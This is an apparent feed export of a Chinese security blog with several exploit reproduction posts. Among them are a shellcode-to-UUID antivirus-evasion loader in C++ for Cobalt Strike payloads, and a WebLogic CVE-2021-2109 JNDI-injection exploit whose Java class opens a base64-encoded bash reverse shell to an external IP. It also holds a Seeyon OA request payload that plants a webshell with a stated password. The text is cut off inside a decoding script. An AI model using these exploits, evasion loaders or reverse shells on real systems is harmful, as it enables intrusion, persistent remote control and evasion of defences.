    <content type="html"><![CDATA[<p><strong>参考文章</strong></p><p><a href="https://testbnull.medium.com/ph%C3%A2n-t%C3%ADch-l%E1%BB%97-h%E1%BB%95ng-proxylogon-mail-exchange-rce-s%E1%BB%B1-k%E1%BA%BFt-h%E1%BB%A3p-ho%C3%A0n-h%E1%BA%A3o-cve-2021-26855-37f4b6e06265" target="_blank" rel="external">https://testbnull.medium.com/ph%C3%A2n-t%C3%ADch-l%E1%BB%97-h%E1%BB%95ng-proxylogon-mail-exchange-rce-s%E1%BB%B1-k%E1%BA%BFt-h%E1%BB%A3p-ho%C3%A0n-h%E1%BA%A3o-cve-2021-26855-37f4b6e06265</a></p><p><a href="https://github.com/sirpedrotavares/Proxylogon-exploit/blob/main/exploit.py" target="_blank" rel="external">https://github.com/sirpedrotavares/Proxylogon-exploit/blob/main/exploit.py</a></p><p>CVE-2021-26855 SSRF+CVE-2021–27065 需要认证的任意文件写入</p><p>需要根据上面的文章对github链接当中的工具进行修改</p><p><strong>修改后效果</strong><br><img src="http://pic.c1imber.top/blog/20210315/5mJFrEWj1dTh.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20210315/L4zFBEAjmED9.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;参考文章&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://testbnull.medium.com/ph%C3%A2n-t%C3%ADch-l%E1%BB%97-h%E1%BB%95ng-proxylogon-mail-exchange-r
      
    
    </summary>
    
      <category term="漏洞复现" scheme="https://c1aysec.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞复现" scheme="https://c1aysec.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>shellcode-uuid免杀</title>
    <link href="https://c1aysec.github.io/2021/01/27/shellcode-uuid%E5%85%8D%E6%9D%80/"/>
    <id>https://c1aysec.github.io/2021/01/27/shellcode-uuid免杀/</id>
    <published>2021-01-27T08:00:40.831Z</published>
    <updated>2021-01-31T13:08:13.761Z</updated>
    
    <content type="html"><![CDATA[<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/" title="RIFT: Analysing a Lazarus Shellcode Execution Method" target="_blank" rel="external">RIFT: Analysing a Lazarus Shellcode Execution Method</a></p><h3 id="生成uuid"><a href="#生成uuid" class="headerlink" title="生成uuid"></a>生成uuid</h3><p>使用cobaltstrike生成python shellcode<br>Attacks-&gt;Packages-&gt;Payload Generator<br>语言选择python（什么语言都可以），这里选择了生成x64的shellcode</p><p><img src="http://pic.c1imber.top/blog/20210127/Sm7ucebbppY5.png?imageslim" alt="mark"></p><p>用python将shellcode转为uuid，因为uuid.UUID(bytes_le=u)当中u的长度需要为16字节，所以需要将shellcode进行分组，每组16字节，不足的用\x00补位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> uuid</div><div class="line">shellcode=<span class="string">"shellcode"</span></div><div class="line">new_shellcode=shellcode+<span class="string">'\x00'</span>*(<span class="number">16</span>-len(shellcode)%<span class="number">16</span>)</div><div class="line">i=<span class="number">0</span></div><div class="line"><span class="keyword">while</span> i&lt;len(new_shellcode):</div><div class="line">    u=new_shellcode[i:i+<span class="number">16</span>]</div><div class="line">    <span class="keyword">print</span> uuid.UUID(bytes_le=u)</div><div class="line">    i+=<span class="number">16</span></div></pre></td></tr></table></figure><p>将文章代码当中弹计算器的uuid替换为上面生成的uuid，编译C++代码：</p><p>编译方式选择：</p><p>如果生成的是64位的shellcode，需要使用releases x64位的方式进行编译</p><p>如果生成的是32位的shellcode，需要使用releases x86位的方式进行编译</p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Rpc.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"Rpcrt4.lib"</span>)</span></div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">char</span>* uuids[] =</div><div class="line">&#123;</div><div class="line">    uuid</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    FreeConsole();</div><div class="line">    HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, <span class="number">0</span>, <span class="number">0</span>);</div><div class="line">    <span class="keyword">void</span>* ha = HeapAlloc(hc, <span class="number">0</span>, <span class="number">0x100000</span>);</div><div class="line">    DWORD_PTR hptr = (DWORD_PTR)ha;</div><div class="line">    <span class="keyword">int</span> elems = <span class="keyword">sizeof</span>(uuids) / <span class="keyword">sizeof</span>(uuids[<span class="number">0</span>]);</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; elems; i++) &#123;</div><div class="line">        RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)hptr);</div><div class="line">        <span class="keyword">if</span> (status != RPC_S_OK) &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"UuidFromStringA() != S_OK\n"</span>);</div><div class="line">            CloseHandle(ha);</div><div class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">        &#125;</div><div class="line">        hptr += <span class="number">16</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"[*] Hexdump: "</span>);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; elems * <span class="number">16</span>; i++) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%02X "</span>, ((<span class="keyword">unsigned</span> <span class="keyword">char</span>*)ha)[i]);</div><div class="line">    &#125;</div><div class="line">    EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, <span class="number">0</span>);</div><div class="line">    CloseHandle(ha);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20210127/ROD2YAmYkBpB.png?imageslim" alt="mark"></p><p>效果：</p><p><img src="http://pic.c1imber.top/blog/20210127/D54GK7Tp3rOm.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20210127/HEErqWse2Msh.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20210127/wanCImTckaJh.png?imageslim" alt="mark"></p><p>可以使用<code>FreeConsole()</code>函数隐藏控制台</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;参考文章&quot;&gt;&lt;a href=&quot;#参考文章&quot; class=&quot;headerlink&quot; title=&quot;参考文章&quot;&gt;&lt;/a&gt;参考文章&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://research.nccgroup.com/2021/01/23/rift-analysi
      
    
    </summary>
    
      <category term="免杀学习" scheme="https://c1aysec.github.io/categories/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="免杀学习" scheme="https://c1aysec.github.io/tags/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>weblogic cve-2021-2109 jndi注入 远程代码执行复现</title>
    <link href="https://c1aysec.github.io/2021/01/22/weblogic%20cve-2021-2109%20jndi%E6%B3%A8%E5%85%A5%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0/"/>
    <id>https://c1aysec.github.io/2021/01/22/weblogic cve-2021-2109 jndi注入 远程代码执行复现/</id>
    <published>2021-01-21T17:06:33.277Z</published>
    <updated>2021-01-25T04:17:09.850Z</updated>
    
    <content type="html"><![CDATA[<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><pre><code>Weblogic Server 10.3.6.0.0Weblogic Server 12.1.3.0.0Weblogic Server 12.2.1.3.0Weblogic Server 12.2.1.4.0Weblogic Server 14.1.1.0.0</code></pre><h1 id="利用方式一：无回显利用-反弹shell"><a href="#利用方式一：无回显利用-反弹shell" class="headerlink" title="利用方式一：无回显利用-反弹shell"></a>利用方式一：无回显利用-反弹shell</h1><p>1、工具github地址：<br><a href="https://github.com/welk1n/JNDI-Injection-Exploit/releases" target="_blank" rel="external">https://github.com/welk1n/JNDI-Injection-Exploit/releases</a></p><p>vps上执行:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="string">"反弹shell的命令"</span> -A <span class="string">"vpsip"</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20210122/bMC5lPgmWyip.png?imageslim" alt="mark"></p><p>vps监听端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -nvlp 8888</div></pre></td></tr></table></figure><p>poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="comment">//192.168.157.189:49163/console/css/%252E%252E%252Fconsolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://4x.xxx.xxx;xxx:1389/01hohc;AdminServer%22)</span></div></pre></td></tr></table></figure><p>反弹成功</p><p><img src="http://pic.c1imber.top/blog/20210122/8eeWBm7dSXuQ.png?imageslim" alt="mark"></p><p>2、也可以直接通过marshalsec-0.0.3-SNAPSHOT-all.jar这个工具进行复现：</p><p>vps上执行：</p><p>启动JNDI服务</p><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -cp marshalsec-<span class="number">0.0</span>.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:<span class="comment">//vpsip:8080/#evilclass</span></div></pre></td></tr></table></figure><p>启动HTTPServer:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -m SimpleHTTPServer 8080</div></pre></td></tr></table></figure><p>http目录下放置恶意class文件，evilclass.class源码如下： </p><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> java.lang.Runtime;</div><div class="line"><span class="keyword">import</span> java.lang.Process;   </div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">evilclass</span> </span>&#123;    </div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">evilclass</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">try</span>&#123;</div><div class="line">            String commands = <span class="string">"bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDUuMTg2LjE0Ni84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span>;</div><div class="line">            Process pc = Runtime.getRuntime().exec(commands);</div><div class="line">            pc.waitFor();</div><div class="line">        &#125; <span class="keyword">catch</span>(Exception e)&#123;</div><div class="line">            e.printStackTrace();</div><div class="line">        &#125;   </div><div class="line"></div><div class="line">    &#125;   </div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span> </span>&#123;</div><div class="line">        evilclass e = <span class="keyword">new</span> evilclass();</div><div class="line">    &#125;   </div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>vps监听端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -nvlp 8888</div></pre></td></tr></table></figure><p>poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="comment">//192.168.157.189:49163/console/css/%252E%252E%252Fconsolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://4x.xxx.xxx;xxx:1389/evilclass;AdminServer%22)</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20210122/3YFpDGLcyPuU.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20210122/Ji8u3iMI39tW.png?imageslim" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20210122/tTHQ753svyST.png?imageslim" alt="mark"></p><h1 id="利用方式二：回显利用"><a href="#利用方式二：回显利用" class="headerlink" title="利用方式二：回显利用"></a>利用方式二：回显利用</h1><p>工具github地址：<br><a href="https://github.com/feihong-cs/JNDIExploit/releases/" target="_blank" rel="external">https://github.com/feihong-cs/JNDIExploit/releases/</a></p><p>vps上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -jar JNDIExploit-v1.11.jar -i vpsip</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20210122/6EClOmzC4Fxr.png?imageslim" alt="mark"></p><p>poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">GET /console/css/%<span class="number">252</span>E%<span class="number">252</span>E%<span class="number">252F</span>consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=<span class="keyword">true</span>&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%<span class="number">22l</span>dap:<span class="comment">//4x.xxx.xxx;xxx:1389/Basic/WeblogicEcho;AdminServer%22) HTTP/1.1</span></div><div class="line">Host: <span class="number">192.168</span>.157.189:<span class="number">49163</span></div><div class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">74.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">74.0</span></div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*<span class="comment">/*;q=0.8</span></div><div class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></div><div class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></div><div class="line"><span class="comment">Connection: close</span></div><div class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></div><div class="line"><span class="comment">cmd: whoami</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20210122/W783nH3AaIFL.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;Weblogic Server 10.3.6.0.0
Weblogic Server 12.1.3.0.0

      
    
    </summary>
    
      <category term="漏洞复现" scheme="https://c1aysec.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞复现" scheme="https://c1aysec.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>Seeyon-OA getshell漏洞复现和payload构造</title>
    <link href="https://c1aysec.github.io/2021/01/22/Seeyon-OA%20getshell%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8Cpayload%E6%9E%84%E9%80%A0/"/>
    <id>https://c1aysec.github.io/2021/01/22/Seeyon-OA getshell漏洞复现和payload构造/</id>
    <published>2021-01-21T16:40:16.320Z</published>
    <updated>2021-01-25T04:17:02.554Z</updated>
    
    <content type="html"><![CDATA[<h1 id="最早流传的payload"><a href="#最早流传的payload" class="headerlink" title="最早流传的payload"></a>最早流传的payload</h1><p>来自狼组知识库（谷歌快照）</p><p>漏洞概述：前台getshell</p><p>影响版本：致远OA &lt;A8+ 通杀</p><p>漏洞利用payload：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">POST /seeyon/autoinstall.<span class="keyword">do</span>.css/..;/ajax.<span class="keyword">do</span>?method=ajaxAction&amp;managerName=formulaManager&amp;requestCompress=gzip HTTP/<span class="number">1.1</span></div><div class="line">Host: <span class="number">127.0</span>.0.1</div><div class="line">Connection: close</div><div class="line">Cache-Control: max-age=<span class="number">0</span></div><div class="line">Upgrade-Insecure-Requests: <span class="number">1</span></div><div class="line">User-Agent: Opera/<span class="number">9.80</span> (Macintosh; Intel Mac OS X <span class="number">10.6</span>.8; U; fr) Presto/<span class="number">2.9</span>.168 Version/<span class="number">11.52</span></div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></div><div class="line"><span class="comment">Sec-Fetch-Site: none</span></div><div class="line"><span class="comment">Sec-Fetch-Mode: navigate</span></div><div class="line"><span class="comment">Sec-Fetch-User: ?1</span></div><div class="line"><span class="comment">Sec-Fetch-Dest: document</span></div><div class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></div><div class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></div><div class="line"><span class="comment">Cookie: JSESSIONID=7B6D8C106BD599DB0EF2F2E3B794A4FA; loginPageURL=; login_locale=zh_CN;</span></div><div class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></div><div class="line"><span class="comment">Content-Length: 8819</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">managerMethod=validate&amp;arguments=%1F%C2%8B%08%00%00%00%00%00%00%00uTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28*%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%1D%C2%AD%C2%81%3C%26%C3%90%C3%89%C2%BCA%3FL%C2%93%C2%B2%C3%B3%C3%B0%13%C2%9E%C2%B9%C2%BB%C2%92%06%1E%C3%86%C2%B5%2F%3B1%C2%B9%C2%81YR%C2%B9%C3%9C%C2%98%C2%95%C2%96A%C3%A6%C2%8A%C3%82mKj%19%C2%8B%C2%9C%C2%A5%C3%8A%C2%82Y%5C%C2%AC%C2%B9%24%C2%80d%C2%9E%03%5E%C3%8F%C3%97D%29%5Cm%2C%1F%07%2F%C3%85Q%5CD%C2%B6%26%C3%B9%C2%90%C3%A8%15%C3%A0p%C3%A1%C2%86%2C%C3%9Ah%C3%83J%0A%C2%87%C3%8FN%C2%A4%5C%C2%B7DM%00%C3%91C%28b%C3%8E%C3%96%C2%84%C2%ABe%40%2C%C2%898%03%C3%A2%C2%B8%C2%825%3EYp%C2%96%26%0C%C3%A8%7B%C2%BAFq%C3%9A%C3%B0%C2%A6%C2%9F%5B%C3%BCJ%00K%C2%B5%C3%B8TFqmc%C2%93%C3%8BH*va%C3%B9%0F%C3%A0_%C2%BE%C3%99%C2%A2%1E%C2%BA%C3%A2%C2%A2%C2%B2L5q%C2%B9%C3%A1%C2%A3%24*%C2%A9e*7iq%C3%B4m3%60mC8%C2%83j2%C2%A3%3A7%C3%80%C2%96%C2%85e%C2%A8%18D%C2%99.%C3%8F%5B%C2%BD%C2%838%0E%28F%25%C2%89%C2%9B%C3%84%C3%A3%C2%95%01%C2%A0%C2%B4L%C3%A9-%3F%C2%B8Bc%C2%95%3A%C3%86%C3%86%C3%9Fse%00%C3%B8%C2%8DoW%01%C3%B2L%15K%C2%8B%0CZ%08%C2%8Fh%7C%2C4W%C2%B9%C2%B4l%C3%AD%C3%96D%C3%856%C3%81%C2%B9%7Dl%C2%B1eQJ7%C3%93%12%C2%ADI%C2%89%5D%02Ygz%1E%C2%9DL%C3%B6%C2%99%C3%A6%C2%B4%C3%8E%C3%BB%C3%996j%C2%BDU%40s%40%C3%B3w%C3%8F%5B%C2%A4%C2%84%C2%80%C3%A0%2B%14K%0Cg%C3%82%01.W%C2%89K%C2%80%C3%AF%C3%9CXd%1F%C3%B6%03%C3%BB%C2%B0%C2%A9%C2%B6%C2%86%C2%8D%C2%ADP%3Fo%0F%C3%92%C3%80B%C3%92%08p%C3%BA%C2%AD%C2%A9%01%12%C2%AE%C3%90T%0D%C3%8B%28%07%C2%B6%C3%A6%23%C2%A8I%C2%A9S%C2%9DG%7B%0E_%C2%9D6%C3%86%C3%B1%1B%C2%BD%26%10%C3%839%C2%A6uU%03%C2%97%28X%C2%9E%C2%AE%26%C2%AA%C2%BEA%C3%B2%21%0B%C3%974%06%C3%87%C3%9C%C3%87%1BT%C3%A6%C2%B6%09%C3%BC%23%C2%A7%C2%87u%C2%AC%1A%C2%A7%0BG%7E%C2%82%C2%AD%C3%8A%C2%8F%3F%C3%BC%19%C3%99%C2%BF%C3%BE%C2%99%C3%88%C2%95%C2%84d%C2%AD%C2%91O%C3%AB%7C%C2%81%C3%8AO%C3%96o%C3%B8%C3%9Ay%C3%A4%12%C2%9D%C2%A7%C3%B5%C2%89%C2%A1%18%24%C2%A0j%C3%B4%C3%9A%C3%BA%C3%94z%C2%8D_%C2%BF%C3%96F%C2%9E%C2%9E%C2%A9%1C%C3%84V%25%C2%9C%5D%C3%96%C2%A6%C3%B9X%C2%A4%C2%B2%28%60XMn%C3%90%18%C3%A6%C2%AE%C2%81o%C3%B4m%C2%BA%C3%97%C2%95%C2%85%12%C2%AAs%C2%9A%C3%97%C3%A2n%C2%977%C3%BD%C3%81%C2%A9x%1F%C3%A9%C3%84%C2%A6%C2%BD*%2FW%18%C2%98%3A%06%C3%BC%3E%C2%B79%C2%9D%3D%12%C3%BD%C3%AD%C2%8F%1C%C3%944%C2%9D%5E%C2%97%1Cc%C3%AAgBc%C2%A0%C3%B1%C3%83%C2%95%1B%29%C2%ACe%08%21%C2%8D%C2%8F%C3%BA%C2%A1%C2%97%C3%90X%C2%A4%C2%A0%0A%C2%9A%C2%9E%C3%9Es%C3%A3%1C%C2%8A%C3%BA%10%C3%92%C3%9A%C3%AE%C2%A6%C3%A3%C2%A6%27%01%C2%A7T%C2%8E9a%5DQgw%C3%A1%C2%B5h%C3%AB%C2%BA*%5C%7E%C3%BF%C3%B8%3E%C3%ADL%C2%9AG%7D%C2%82R%C3%90%C2%9F%C2%BCh%C3%B3o%C3%83%C2%99%07bH%07%1E%C3%9E%C3%AFv%C3%96%3FW%C3%AA%C3%BDw%C2%AA%5B%C2%B3%3B%C3%93%C3%9A%C2%B6L%C3%AF%0E%C3%98o%C3%AFI%7E%3AQ%C2%80f%09%3C%7C%C3%A9%1C%0F%C2%8B%C2%AF%C3%8F%1F%C2%97%C3%84%C3%87%7D%C3%93o%18%1C%C3%B5%3E%C2%82%C3%BF%C2%9F.%C3%80q%C3%AAQ%C3%87%7E%7C%C2%AF%C3%B7%21%25%C2%A0wb%C3%92%C3%8C%C3%89%10%60%C3%8A%C2%B2%C3%AC%3D%C2%BCv%7F%C3%90%25I%17%C3%A5k%7Dg%C2%97%C3%9C%C3%AB%C3%BE%C3%BD%2FheA%C3%A4_%05%00%00</span></div></pre></td></tr></table></figure><p>该payload执行完将会写入冰蝎3 jspx木马</p><p>默认马pass：rebeyond</p><p>Webshell地址：127.0.0.1/seeyon/SeeyonUpdate1.jspx</p><h1 id="如何控制写入的文件内容和文件名"><a href="#如何控制写入的文件内容和文件名" class="headerlink" title="如何控制写入的文件内容和文件名"></a>如何控制写入的文件内容和文件名</h1><h3 id="第一步：arguments参数解码"><a href="#第一步：arguments参数解码" class="headerlink" title="第一步：arguments参数解码"></a>第一步：arguments参数解码</h3><p>根据poc当中的参数可以大致看出当中的arguments参数的内容是经过了gzip压缩和url编码的处理</p><p>但是这里直接对arguments参数当中的内容进行gzip解码是解码不出来的</p><p>因为正常的gzip文件头应该是1f8b08，但是这里url解码后的内容，头部数据是1fc28b08</p><p><img src="http://pic.c1imber.top/blog/20210122/S4VDUi2FPNnQ.png?imageslim" alt="mark"></p><p>所以这里需要转一下编码，对url解码的字节流进行utf-8解码才可以</p><p>这里编写脚本解码的时候有个坑，在上面payload的arguments这个POST参数当中，存在<code>%1F%C2%8B%08%00%00%00%00%00%00%00uTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+....</code>这段内容，这里的+实际上应该是%20空格，但是因为是在post数据当中，空格变成了+，但是python当中的urllib.unquote是不能把+解为空格的，所以在这里的+导致了gzip数据格式出错，出现解码失败的问题</p><p>解码失败的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> zlib</div><div class="line"><span class="keyword">import</span> urllib</div><div class="line">gzip_data = urllib.unquote(<span class="string">"%1F%C2%8B%08%00%00%00%00%00%00%00uTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28*%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%1D%C2%AD%C2%81%3C%26%C3%90%C3%89%C2%BCA%3FL%C2%93%C2%B2%C3%B3%C3%B0%13%C2%9E%C2%B9%C2%BB%C2%92%06%1E%C3%86%C2%B5%2F%3B1%C2%B9%C2%81YR%C2%B9%C3%9C%C2%98%C2%95%C2%96A%C